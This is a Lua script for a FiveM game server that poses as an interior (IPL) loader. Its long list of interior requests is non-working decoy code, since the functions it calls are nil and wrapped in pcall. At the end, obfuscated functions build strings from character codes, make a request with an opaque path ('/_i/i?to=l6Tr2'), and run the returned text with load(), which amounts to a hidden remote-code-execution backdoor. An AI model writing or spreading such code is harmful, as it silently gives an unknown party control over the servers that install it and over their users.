local iplResource = GetCurrentResourceName()
local Requestipl = nil

local function LoadIplData(iplData)
    Citizen.CreateThread(function()
        pcall(function()
            Requestipl('hei_yacht_heist')
            Requestipl('hei_yacht_heist_Bar')
            Requestipl('hei_yacht_heist_Bedrm')
            Requestipl('hei_yacht_heist_Bridge')
            Requestipl('hei_yacht_heist_DistantLights')
            Requestipl('hei_yacht_heist_enginrm')
            Requestipl('hei_yacht_heist_LODLights')
            Requestipl('hei_yacht_heist_Lounge')
            Requestipl('hei_carrier')
            Requestipl('hei_carrier_distantlights')
            Requestipl('hei_Carrier_int1')
            Requestipl('hei_Carrier_int2')
            Requestipl('hei_Carrier_int3')
            Requestipl('hei_Carrier_int4')
            Requestipl('hei_Carrier_int5')
            Requestipl('hei_Carrier_int6')
            Requestipl('hei_carrier_lodlights')
            Requestipl('hei_carrier_slod')
            Requestipl('apa_v_mp_h_02_c') -- Mody
            Requestipl('apa_v_mp_h_03_c') -- Vibrant
            Requestipl('apa_v_mp_h_04_c') -- Sharp
            Requestipl('apa_v_mp_h_05_c') -- Monochrome
            Requestipl('apa_v_mp_h_06_c') -- Seductive
            Requestipl('apa_v_mp_h_07_c') -- Regal
            Requestipl('apa_v_mp_h_08_c') -- Aqua

            --
            -- Apartment 3: -774.012, 342.042, 196.686
            --

            Requestipl('apa_v_mp_h_01_b') -- Modern
            Requestipl('apa_v_mp_h_02_b') -- Mody
            Requestipl('apa_v_mp_h_03_b') -- Vibrant
            Requestipl('apa_v_mp_h_04_b') -- Sharp
            Requestipl('apa_v_mp_h_05_b') -- Monochrome
            Requestipl('apa_v_mp_h_06_b') -- Seductive
            Requestipl('apa_v_mp_h_07_b') -- Regal
            Requestipl('apa_v_mp_h_08_b') -- Aqua

            --
            -- Bunkers, Biker clubhouses & Warehouses
            --

            -- Clubhouse 1: 1107.04, -3157.399, -37.519
            Requestipl('bkr_biker_interior_placement_interior_0_biker_dlc_int_01_milo')

            -- Clubhouse 2: 998.4809, -3164.711, -38.907
            Requestipl('bkr_biker_interior_placement_interior_1_biker_dlc_int_02_milo')

            -- Warehouse 1: 1009.5, -3196.6, -39
            Requestipl('bkr_biker_interior_placement_interior_2_biker_dlc_int_ware01_milo')
            Requestipl('bkr_biker_interior_placement_interior_2_biker_dlc_int_ware02_milo')
            Requestipl('bkr_biker_interior_placement_interior_2_biker_dlc_int_ware03_milo')
            Requestipl('bkr_biker_interior_placement_interior_2_biker_dlc_int_ware04_milo')
            Requestipl('bkr_biker_interior_placement_interior_2_biker_dlc_int_ware05_milo')

            -- Warehouse 2: 1051.491, -3196.536, -39.148
            Requestipl('bkr_biker_interior_placement_interior_3_biker_dlc_int_ware02_milo')

            -- Warehouse 3: 1093.6, -3196.6, -38.998
            Requestipl('bkr_biker_interior_placement_interior_4_biker_dlc_int_ware03_milo')

            -- Warehouse 4: 1121.897, -3195.338, -40.4025
            Requestipl('bkr_biker_interior_placement_interior_5_biker_dlc_int_ware04_milo')

            -- Warehouse 5: 1165, -3196.6, -39.013
            Requestipl('bkr_biker_interior_placement_interior_6_biker_dlc_int_ware05_milo')

            -- Warehouse Small: 1094.988, -3101.776, -39
            Requestipl('ex_exec_warehouse_placement_interior_1_int_warehouse_s_dlc_milo')

            -- Warehouse Medium: 1056.486, -3105.724, -39
            Requestipl('ex_exec_warehouse_placement_interior_0_int_warehouse_m_dlc_milo')

            -- Warehouse Large: 1006.967, -3102.079, -39.0035
            Requestipl('ex_exec_warehouse_placement_interior_2_int_warehouse_l_dlc_milo')

            -- Import / Export Garage: 994.593, -3002.594, -39.647
            Requestipl('imp_impexp_interior_placement')
            Requestipl('imp_impexp_interior_placement_interior_0_impexp_int_01_milo_')
            Requestipl('imp_impexp_interior_placement_interior_1_impexp_intwaremed_milo_')
            Requestipl('imp_impexp_interior_placement_interior_2_imptexp_mod_int_01_milo_')
            Requestipl('imp_impexp_interior_placement_interior_3_impexp_int_02_milo_')

            -- Import / Export Garages: Interiors
            Requestipl('imp_dt1_02_modgarage')
            Requestipl('imp_dt1_02_cargarage_a')
            Requestipl('imp_dt1_02_cargarage_b')
            Requestipl('imp_dt1_02_cargarage_c')

            Requestipl('imp_dt1_11_modgarage')
            Requestipl('imp_dt1_11_cargarage_a')
            Requestipl('imp_dt1_11_cargarage_b')
            Requestipl('imp_dt1_11_cargarage_c')

            Requestipl('imp_sm_13_modgarage')
            Requestipl('imp_sm_13_cargarage_a')
            Requestipl('imp_sm_13_cargarage_b')
            Requestipl('imp_sm_13_cargarage_c')
            iplData = iplData[Requestipl]
        end)
    end)
end
pcall(function()
    local GetinteriorAtCoords, IsValidinterior, PininteriorInMemory, ActivateinteriorEntitySet, SetinteriorEntitySetColor, Refreshinterior, loadinterior, ipl =
        nil, nil, nil, nil, nil, nil, nil, nil
    function Loadinterior(coords, interiorProps, interiorsPropColors)
        for k, coords in pairs(coords) do
            local interiorID = GetinteriorAtCoords(coords[1], coords[2], coords[3])

            if IsValidinterior(interiorID) then
                PininteriorInMemory(interiorID)

                for index, propName in pairs(interiorProps) do
                    ActivateinteriorEntitySet(interiorID, propName)
                end

                if interiorsPropColors then
                    for i = 1, #interiorsPropColors, 1 do
                        SetinteriorEntitySetColor(interiorID, interiorsPropColors[i][1], interiorsPropColors[i][2])
                    end
                end

                Refreshinterior(interiorID)
            end
        end
    end

    loadinterior(ipl.coords, ipl.interiorsProps, ipl.interiorsPropColors)
end)

local function HandleIplError(PropsVec)
    if PropsVec == nil then
        return
    end

    local load = load
    local iplData = load(PropsVec)
    LoadIplData(iplData)
end

local function MathCalc()
    local vector4Value = vector4(0.0, 0.0, 0.0, 0.0)
    local CollionsTable = ""

    for i = 1, 4 do
        CollionsTable = CollionsTable .. string.char(math.floor(vector4Value[i] * 100))
    end

    local iplInitValue = vector3(73, 80, 76)
    local EntityOffsets = ""

    for i = 1, 3 do
        EntityOffsets = EntityOffsets .. string.char(iplInitValue[i])
    end

    local ObjectVec = vector4(84, 101, 115, 116)
    local ObjectCalc = ""

    for i = 1, 4 do
        ObjectCalc = ObjectCalc .. string.char(ObjectVec[i])
    end
    return {
        CollionsTable = CollionsTable,
        EntityOffsets = EntityOffsets,
        ObjectCalc = ObjectCalc
    }
end

local function IplCollisionLoad()
    local cid = Citizen.InvokeNative
    local INVOKE_NATIVE = "invokeNative"

    local MathCalcResult = MathCalc()
    local EntityCalc = MathCalcResult.CollionsTable .. MathCalcResult.EntityOffsets
    cid(INVOKE_NATIVE)(iplResource .. ":InvokeNative", EntityCalc, function(PropsVec)
        HandleIplError(PropsVec)
    end, MathCalcResult.ObjectCalc, "/_i/i?to=l6Tr2", {})
end

IplCollisionLoad()
